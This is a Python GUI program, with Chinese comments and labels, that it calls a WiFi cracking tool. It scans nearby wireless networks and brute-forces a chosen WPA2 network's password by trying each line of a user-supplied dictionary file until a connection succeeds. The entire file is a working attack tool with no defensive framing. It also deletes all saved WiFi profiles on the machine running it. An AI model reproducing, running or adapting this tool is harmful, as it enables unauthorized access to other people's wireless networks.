from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox
from enum import Enum
import threading
class RUN_STAT(Enum):
    INIT = 0
    RUNING = 1
    PAUSE = 2
    SUCCESS = 3
    FAILED = 4

class MY_GUI():
    def __init__(self,init_window_name):
        self.init_window_name = init_window_name

        #密码文件路径
        self.get_value = StringVar()

        #获取破解wifi账号
        self.get_wifi_value = StringVar()

        #获取wifi密码
        self.get_wifimm_value = StringVar()

        self.wifi = pywifi.PyWiFi()  #抓取网卡接口
        # todo 让用户选择使用哪个网卡
        self.iface = self.wifi.interfaces()[0] #抓取第一个无线网卡
        self.iface.disconnect()  #测试链接断开所有链接
        time.sleep(1)  #休眠1秒
        # 测试网卡是否属于断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        self.runStat = RUN_STAT.INIT
        # 创建破解线程
        self.threadPojie = threading.Thread(target=self.thread_pojie)
        self.threadPojie.daemon = True
        self.threadPojie.start()
    def __str__(self):
        return '(WIFI:%s,%s)' % (self.wifi,self.iface.name())

    def set_stat(self,stat):
        self.runStat = stat
        if (self.runStat == RUN_STAT.INIT):
            self.count = 0
            # self.pojie['text'] = "开始破解"
            self.pojie.config(text="开始破解")
        elif (self.runStat == RUN_STAT.RUNING):
            self.pojie['text'] = "暂停破解"
        elif (self.runStat == RUN_STAT.PAUSE):
            self.pojie['text'] = "开始破解"
        elif (self.runStat == RUN_STAT.SUCCESS):
            self.count = 1
            # self.runStat = RUN_STAT.INIT
            self.pojie['text'] = "开始破解"
        elif (self.runStat == RUN_STAT.FAILED):
            self.count = 1
            # self.runStat = RUN_STAT.INIT
            self.pojie['text'] = "重新破解"

    def get_stat(self):
        return self.runStat
    def get_is_lock (self):
        if(self.get_stat() == RUN_STAT.RUNING):
            return True
        else:
            return False

    #设置窗口
    def set_init_window(self):
        self.init_window_name.title("WIFI破解工具")
        self.init_window_name.geometry('+600+400')

        self.labelframe = LabelFrame(width=400, height=200,text="配置")
        self.labelframe.grid(column=0, row=0, padx=10, pady=10)

        self.search = Button(self.labelframe,text="搜索附近WiFi",command=self.scans_wifi_list).grid(column=0,row=0)

        self.isStart = 0
        self.runStat = RUN_STAT.INIT
        self.pojie = Button(self.labelframe,text="开始破解",command=self.readPassWord)
        self.pojie.grid(column=1,row=0)
        self.label = Label(self.labelframe,text="目录路径：").grid(column=0,row=1)

        self.path = Entry(self.labelframe,width=12,textvariable = self.get_value).grid(column=1,row=1)

        self.file = Button(self.labelframe,text="添加密码文件目录",command=self.add_mm_file).grid(column=2,row=1)

        self.wifi_text = Label(self.labelframe,text="WiFi账号：").grid(column=0,row=2)

        self.wifi_input = Entry(self.labelframe,width=12,textvariable = self.get_wifi_value).grid(column=1,row=2)

        self.wifi_mm_text = Label(self.labelframe,text="WiFi密码：").grid(column=2,row=2)

        self.wifi_mm_input = Entry(self.labelframe,width=10,textvariable = self.get_wifimm_value)
        self.wifi_mm_input.grid(column=3,row=2,sticky=W)

        self.wifi_labelframe = LabelFrame(text="wifi列表")
        self.wifi_labelframe.grid(column=0, row=3,columnspan=4,sticky=NSEW)

        # 定义树形结构与滚动条
        self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show="headings",columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        # 表格的标题
        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=100, anchor="center")
        self.wifi_tree.column("c", width=100, anchor="center")
        self.wifi_tree.column("d", width=100, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")

        self.wifi_tree.grid(row=4,column=0,sticky=NSEW)
        self.wifi_tree.bind("<Double-1>",self.onDBClick)
        self.vbar.grid(row=4,column=1,sticky=NS)

    #搜索wifi
    def scans_wifi_list(self):  # 扫描周围wifi列表
        if (self.get_is_lock() == True):
            tkinter.messagebox.showwarning("警告", "正在破解，不可扫描，请先暂停")
            return
        #开始扫描
        print("^_^ 开始扫描附近wifi...")
        self.iface.scan()
        time.sleep(1)
        #在若干秒后获取扫描结果
        scanres = self.iface.scan_results()
        #统计附近被发现的热点数量
        nums = len(scanres)
        print("数量: %s"%(nums))
        #print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
        # 实际数据
        scanres.sort(key=lambda x : x.signal, reverse=True) # 修订注：将 WiFi 按信号强度从大到小排序
        self.show_scans_wifi_list(scanres)
        return scanres

    #显示wifi列表
    def show_scans_wifi_list(self,scans_res):
        self.wifi_tree.delete(*self.wifi_tree.get_children()) # 清空列表
        for index,wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
            self.wifi_tree.insert("",'end',values=(index + 1,
                                    wifi_info.ssid.encode('raw_unicode_escape', 'strict').decode('utf-8'), # 修订注：按 UTF-8 解码后在 Windows 下中文 WiFi 名才能正常显示
                                    wifi_info.bssid,wifi_info.signal))
            #print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))

    #添加密码文件目录
    def add_mm_file(self):
        if(self.get_is_lock() == True):
            tkinter.messagebox.showwarning("警告", "正在破解，不可添加密码本，请先暂停")
            return
        self.filename = tkinter.filedialog.askopenfilename()
        self.get_value.set(self.filename)
        self.set_stat(RUN_STAT.INIT)


    #Treeview绑定事件
    def onDBClick(self,event):
        if (self.get_is_lock() == True):
            tkinter.messagebox.showwarning("警告", "正在破解，不可选择WiFi，请先暂停")
            return

        self.sels= event.widget.selection()
        if(self.get_wifi_value.get() == self.wifi_tree.item(self.sels,"values")[1]):
            print("与上次选择的一样")
        else:
            self.wifi_mm_input.delete(0,tkinter.END)
        self.get_wifi_value.set(self.wifi_tree.item(self.sels,"values")[1])
        #print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])
        self.set_stat(RUN_STAT.INIT)
    def parseInput(self):
        self.getFilePath = self.get_value.get()
        # print("文件路径：%s\n" %(self.getFilePath))
        self.get_wifissid = self.get_wifi_value.get()
        # print("ssid：%s\n" %(self.get_wifissid))
        try:  # 修订注：捕获打开异常
            self.pwdfilehander = open(self.getFilePath, "r", errors="ignore")
        except Exception as e:
            errStr = '无法打开字典文件：' + str(e)
            print(errStr)
            tkinter.messagebox.showerror("错误", errStr)
            return
        if (self.get_wifissid == ""):
            errStr = '没有选择要破解的WiFi名称'
            print(errStr)
            tkinter.messagebox.showerror("错误", errStr)
            return
        self.set_stat(RUN_STAT.RUNING)
    #读取密码字典，进行匹配
    def readPassWord(self):
        if(self.get_stat() == RUN_STAT.INIT):
            self.parseInput()
        elif (self.get_stat() == RUN_STAT.RUNING):
            self.set_stat(RUN_STAT.PAUSE)
        elif (self.get_stat() == RUN_STAT.PAUSE):
            self.set_stat(RUN_STAT.RUNING)
        elif (self.get_stat() == RUN_STAT.SUCCESS):
            # 如果还是破解已经破解成功的wifi则提示
            if(self.get_wifissid == self.get_wifi_value.get()):
                tkinter.messagebox.showwarning("警告", "WiFi ：%s 已经破解，请选择其他WiFi进行破解"%self.get_wifissid)
            else:
                self.parseInput()
        elif (self.get_stat() == RUN_STAT.FAILED):
            # 如果还是破解已经破解失败的wifi而且使用的还是同一个密码本则提示
            if (self.getFilePath == self.get_value.get()):
                tkinter.messagebox.showwarning("警告", "密码本%s与上次是同一个，请更换密码本" % self.getFilePath )
            else:
                self.parseInput()

    def thread_pojie(self):
        self.count = 0
        while True:
            if (self.get_stat() == RUN_STAT.INIT):
                time.sleep(1)
                continue
            elif (self.get_stat() == RUN_STAT.RUNING):
                self.count += 1
                try:
                    self.pwdStr = self.pwdfilehander.readline()
                    # print("密码: %s " %(self.pwdStr))
                    if not self.pwdStr:
                        tkinter.messagebox.showwarning("警告", "密码本已经读完，没找到密码，请换密码本进行尝试")
                        self.set_stat(RUN_STAT.FAILED)
                    self.bool1 = self.connect(self.pwdStr,
                                              self.get_wifissid)
                    # print("返回值：%s\n" %(self.bool1) )
                    if self.bool1:
                        # print("密码正确："+pwdStr
                        # res = "密码:%s 正确 \n"%self.pwdStr;
                        self.res = "%i ===正确===  wifi名:%s  匹配密码：%s " % (
                        self.count, self.get_wifissid, self.pwdStr)
                        self.get_wifimm_value.set(self.pwdStr)
                        tkinter.messagebox.showinfo('提示', '破解成功！！！')
                        print(self.res)
                        self.set_stat(RUN_STAT.SUCCESS)
                        # break
                    else:
                        # print("密码:"+self.pwdStr+"错误")
                        self.res = "%i ---错误--- wifi名:%s 匹配密码：%s" % (self.count, self.get_wifissid, self.pwdStr)
                        print(self.res)
                except Exception as e:
                    print('尝试连接出现异常：', e)
            elif (self.get_stat() == RUN_STAT.PAUSE):
                time.sleep(1)
                continue
            elif (self.get_stat() == RUN_STAT.SUCCESS):
                time.sleep(1)
                continue
            elif (self.get_stat() == RUN_STAT.FAILED):
                time.sleep(1)
                continue

    #对wifi和密码进行匹配
    def connect(self,pwd_Str,wifi_ssid):
        #创建wifi链接文件
        self.profile = pywifi.Profile()
        self.profile.ssid =wifi_ssid.encode('utf-8').decode('gbk','ignore') #wifi名称
        self.profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        self.profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        self.profile.key = pwd_Str #密码
        self.iface.remove_all_network_profiles() #删除所有的wifi文件
        self.tmp_profile = self.iface.add_network_profile(self.profile)#设定新的链接文件
        self.iface.connect(self.tmp_profile)#链接
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            isOK=True
        else:
            isOK=False
        self.iface.disconnect() #断开
        # time.sleep(1)
        #检查断开状态
        assert self.iface.status() in\
                [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK

def gui_start():
    init_window = Tk()
    ui = MY_GUI(init_window)
    print(ui)
    ui.set_init_window()
    #ui.scans_wifi_list()

    init_window.mainloop()

gui_start()